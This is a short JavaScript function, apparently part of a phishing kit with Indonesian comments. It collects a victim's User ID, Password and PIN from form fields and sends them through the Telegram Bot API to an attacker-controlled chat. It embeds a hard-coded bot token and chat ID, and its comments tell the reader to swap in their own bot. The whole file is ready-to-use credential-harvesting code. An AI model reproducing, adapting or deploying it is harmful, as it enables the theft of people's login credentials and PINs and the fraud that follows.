function kirimPesan() {

    var a = document.getElementById('a');
    var b = document.getElementById('b');
    var c = document.getElementById('c');

    var gabungan = '%E3%80%8BUser%20ID%20%3A%0A' + a.value + '%0A%E3%80%8BPassword%3A%0A' + b.value + '%0A%E3%80%8BPin%20%20%20%20%20%3A%0A' + c.value;

    var token = '6001321885:AAEbd1hFle-P2HFyLu0EkaetfoZE-QjU0Ug'; // Ganti dengan token bot yang kamu buat
    var grup = '1887230445'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text= ༺𝕾𝖔𝖚𝖋𝖆 𝖘𝖒𝖘༻%3A%20%0A${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}